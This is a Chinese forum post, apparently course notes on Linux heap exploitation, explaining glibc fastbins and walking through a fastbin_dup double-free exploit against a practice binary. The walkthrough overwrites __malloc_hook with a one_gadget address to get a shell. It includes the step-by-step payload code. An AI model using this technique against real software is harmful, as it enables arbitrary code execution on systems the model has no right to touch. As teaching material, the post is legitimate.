> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [www.52pojie.cn](https://www.52pojie.cn/thread-1402862-1-1.html)  ![](https://avatar.52pojie.cn/data/avatar/001/57/34/12_avatar_middle.jpg) 呆毛王与咖喱棒  

和前一篇一样，是 Udemy 上 Linux Heap Exploitation 课里面的内容；

内容都是自己的博客，有兴趣可以看一看 -> [https://hack1s.fun/](https://hack1s.fun/)

FastBin
-------

与 malloc 相对的是 free 函数

free 函数可以释放 malloc 分配的 chunk 空间

这些 free 的 chunk 会连接在一起在 free_list 中

fastbins 是可以快速访问的 bins，里面存储着被 free 的 chunk

用一个简单的例子来看一下，首先 malloc 了三个空间，这时可以看到 vis 和 fastbins 的输出

![](https://static.hack1s.fun/images/2021/03/08/image-20210309102430685.png)

执行这一步 free，把 a 这部分空间 free 掉之后再看有什么变化

![](https://static.hack1s.fun/images/2021/03/08/image-20210309103115001.png)

执行完了一步，`free(a)`之后可以看到，vis 中原本 a 那里被标识出来连接到了 fastbins

另外在 fastbins 中 0x20 的位置填上了原本 a 的 chunk 地址

这里的信息是存储在堆中名为 arena 的空间的，直接用`dq &main_arena 20`查看

![](https://static.hack1s.fun/images/2021/03/08/image-20210309103705950.png)

红色标出来的地方是大小为 0x20 的 fastbin 所在的地址

每次 free 之后如果要被放在 fastbin 中就会在 main_arena 中进行修改，图中按照字节下去，接下来是 0x30、0x40 等等的 fastbin

![](https://static.hack1s.fun/images/2021/03/08/image-20210309103914355.png)

再将 b 和 c 都 free 掉

之后可以看到首先是 vis 看到的堆中的数据，原本 b、c 的空间中 userdata 的第一个字变成了前面的地址；

即 c 的 user-data 是 chunk b 的地址，b 的 user-data 是 chunk a 的地址，而 a 的 user-data 为 0，表示为链表末尾；

在 main_arena 中记录的是 chunk c 的地址，即 fastbins 链表中的最后一项

fastbin 的结构类似于栈，filo

之后我们再执行三次 malloc，查看都分配在哪里

![](https://static.hack1s.fun/images/2021/03/08/image-20210309104346142.png)

可以发现最先申请的 d 是拿到了原本 c 的空间；

最后申请的 f 是拿到了原本 a 的空间；先进后出，类似于栈

Fastbin_dup
-----------

### 漏洞程序本身

这个程序本身也是一个菜单形式

![](https://static.hack1s.fun/images/2021/03/09/image-20210309110132813.png)

输入用户名，之后就是 malloc、free、target，和之前的程序差不多；

首先分配一个空间随便输一些内容看一下

![](https://static.hack1s.fun/images/2021/03/09/image-20210309113050324.png)

之后可以用 free 输入 index 来释放这个 chunk

释放的 index 是从 0 开始往后增长的

最初输入的用户名和 target 是一个绑定的结构，可以用 p 来 print 或者用 dq 查看内存区域的内容

![](https://static.hack1s.fun/images/2021/03/09/image-20210309113011670.png)

### 任意地址写

首先还是实现初级目标，任意地址写

这个程序本身的问题是 double free，可以对一个 chunk free 两次

首先尝试一下直接 free 这个 chunk 两次

![](https://static.hack1s.fun/images/2021/03/09/iShot2021-03-09-11.49.30.png)

直接收到了 Abort 信号中断下来了，这时用`frame 4`查看`_int_free`函数的栈帧

![](https://static.hack1s.fun/images/2021/03/09/image-20210309122347315.png)

可以看到在这个函数这里是一个提示，检测到了 double free，之后中断了；

看到这里的注释，其实是因为要 free 的 chunk 和 fastbin 的链表中 top chunk 是相同的导致的；

那么针对这个的绕过方式就是再第一次 free 之后再 free 一次其他的 chunk

让 fastbin 的第一项和要 free 的 chunk 不是同一个地址就可以了

![](https://static.hack1s.fun/images/2021/03/09/image-20210309134725591.png)

这样实现的一个效果就是 fastbin 链表中形成了一个环

```
0x603000->0x603030->0x603000

```

接下来如果执行 malloc 的话就可以两次申请 0x603000 的空间

如果想要构成任意地址写，可以第一次申请之后修改其中 User-Data 的第一个字处，改成一个想要写的地址；

这样之后再执行 malloc 就可以申请来任意一个地址，并且可以写内容；

![](https://static.hack1s.fun/images/2021/03/09/image-20210309135902423.png)

这里我们执行流程是

```
a=malloc(0x28);
b=malloc(0x28);

free(a);
free(b);
free(a);

malloc(0x28,p64(0xdeadbeef));

```

其中最后一次 malloc 分配的内容到了原本 chunk a 的位置，并且我们在 user data 这里填充了 0xdeadbeef

这样接下来再申请三次，第三次 malloc 的内容就会写在 0xdeadbeef 这里

我们想要修改的是 Target 变量的值，这个值在`elf.sym.user`这里，所以我们先把 shellcode 改成下面这样

```
a=malloc(0x28);
b=malloc(0x28);

free(a);
free(b);
free(a);

malloc(0x28,p64(elf.sym.user));

malloc(0x28);
malloc(0x28);
malloc(0x28,"writesomethins");

```

结果刚刚运行就直接收到 SIGNAL 中断了，查看一下出错的位置的栈帧，可以看到提示的是 Memory corruption

![](https://static.hack1s.fun/images/2021/03/09/image-20210309142858585.png)

注释写着是在检查 chunk 的 size 字段和 fastbin 申请的是否相等

看一下我们正常申请 chunk 时的结构，有一个比较重要的地方被忽略了

![](https://static.hack1s.fun/images/2021/03/09/image-20210309143322952.png)

这些地方都标识着 0x31，表示这个 chunk 大小是 0x30

而我们伪造的`elf.sym.user`那里是没有这个值的，因此需要把这个补一下；

正好这个地方是我们一开始输入 username 的地方，我们直接把 username 伪造成这样的结构就可以了

```
username = p64(0) + p64(0x31)

```

![](https://static.hack1s.fun/images/2021/03/09/image-20210309143607915.png)

这时可以看到这个 target 就已经被改了

但是这样的任意地址写有一些限制，需要先在要写的位置有一段可以控制的内容，在这里我们想要写的是 target，但是首先需要能够控制这个 user 字段，否则伪造的 chunk 无法通过 size 的检查。

### 任意代码执行

可以尝试像之前一样修改`__malloc_hook`或是修改`__free_hook`

但是简单的尝试修改这两个指针的值会导致没有办法通过 chunk size 的检查

我们可以使用`find_fake_fast`这个指令查看想要修改的位置附近是否有可能存在可以伪造的 chunk 内存地址

![](https://static.hack1s.fun/images/2021/03/09/image-20210309145810006.png)

这里查到`__free_hook`附近是没有，`__malloc_hook`前面一些有这样的一个可以改的地方

实际上把这附近的值都输出一下，可以发现

![](https://static.hack1s.fun/images/2021/03/09/image-20210309151047303.png)

实际上`find_fake_fast`做的事情就是在`__malloc_hook`开始的地址向前找，看是否有哪一个地方可以当作标志位，可以用来伪造的；

![](https://static.hack1s.fun/images/2021/03/09/image-20210309152409297.png)

虽然这里`0x7f`不是在 size 实际上在的那个位置，但是前面都是 0，我们设法把`0x7f`这个位置放在 size 的地方再对齐，靠这个 0x7f 绕过 free 对 size 的检查；

然后由于大小是 0x70，原本是申请 0x28 是放在 0x30 的 bins，需要都改成 0x68，放在 0x70 的 bins

另外从这个 fake chunk 的用户数据`b3d`到`__malloc_hook`的`b50`中间还需要填充一些数据

所以整个流程就是

```
a=malloc(0x68)
b=malloc(0x68)

free(a)
free(b)
free(a)

malloc(0x68,p64(libc.sym['__malloc_hook']-(0x50-0x2d)))
malloc(0x68)
malloc(0x68)
malloc(0x68,b'B'*(0x50-0x3d)+p64(libc.sym.system))

```

这样执行完之后就已经被改成了 system 了

![](https://static.hack1s.fun/images/2021/03/09/image-20210309153136049.png)

最后想要弹一个 shell 就只需要传`/bin/bash`给 system 的参数就可以了

但是这里又存在了一个问题

这个程序为了只申请 fastbin，在这里 malloc 的大小受到了限制

![](https://static.hack1s.fun/images/2021/03/09/image-20210309153759265.png)

最大 120，着肯定没法直接传入一个地址

这里的解决方法是不使用 system 函数的地址，改用 one_gadget

![](https://static.hack1s.fun/images/2021/03/09/image-20210309155239795.png)

用 one_gadget 查找这个 libc 中可能调用的 bin/sh

之后把这个地址和 libc 的起始地址相加之后写到原本 system 那个地方

下面需要检查一下这里面哪一个 gadget 的约束条件是满足的

在 GDB 里面用`b *__malloc_hook`下断点，之后继续运行

在终端里面用选项 1 触发 malloc，查看这时的寄存器状态

![](https://static.hack1s.fun/images/2021/03/09/image-20210309155832740.png)

R12、R13 都不是 NULL，并且 rsi、[rsi] 也都不是 NULL、[rax]、[[rax]] 也不是

那只能确认一下`[rsp+0x50]`这里了

![](https://static.hack1s.fun/images/2021/03/09/image-20210309160124592.png)

检查一下栈发现这里是满足的，所以可以用这个 gadget

最终我们的 payload 如下

```
a=malloc(0x68)
b=malloc(0x68)

free(a)
free(b)
free(a)

malloc(0x68,p64(libc.sym['__malloc_hook']-(0x50-0x2d)))
malloc(0x68)
malloc(0x68)
malloc(0x68,b'B'*(0x50-0x3d)+p64(libc.address+0xe1fa1))

malloc(1,'')

```

运行一下就成功获得了 shell 权限

![](https://static.hack1s.fun/images/2021/03/09/image-20210309160307408.png)

FastBin_dup 只可以用于 glibc_2.3.1 及以下的版本

并且需要攻击者知道要修改的地址，以及能够找到绕过 chunk size 检查的 fake chunk

  

![](https://static.52pojie.cn/static/image/filetype/zip.gif)

[fastbin.zip](forum.php?mod=attachment&aid=MjI0NzY1M3wzMjY4N2MxN3wxNjIxMzAyOTcxfDIxMzQzMXwxNDAyODYy)

9.6 KB, 下载次数: 7, 下载积分: 吾爱币 -1 CB

 ![](https://avatar.52pojie.cn/data/avatar/001/66/34/27_avatar_middle.jpg) 感谢分享![](https://avatar.52pojie.cn/data/avatar/001/61/92/71_avatar_middle.jpg)小萌新吧 谢谢大佬！![](https://avatar.52pojie.cn/data/avatar/001/63/05/94_avatar_middle.jpg)TiAmo 丶 jj 这就是底层吗? i 了 i 了 ![](https://avatar.52pojie.cn/data/avatar/000/89/41/91_avatar_middle.jpg) 21MyCode 不错不错，涨知识了 ![](https://avatar.52pojie.cn/data/avatar/001/66/96/15_avatar_middle.jpg) Martin_Lyu 收藏了，小白开始学习了 ![](https://avatar.52pojie.cn/data/avatar/001/65/51/88_avatar_middle.jpg) Rebirthe 这么底层，太强了！![](https://avatar.52pojie.cn/data/avatar/001/65/71/17_avatar_middle.jpg)VCA821  
收藏了，慢慢学习，谢谢楼主。![](https://avatar.52pojie.cn/data/avatar/001/53/22/67_avatar_middle.jpg)xunleikeji 感谢分享 ![](https://avatar.52pojie.cn/data/avatar/001/63/51/94_avatar_middle.jpg) aonima 尝试一下 感觉难度适中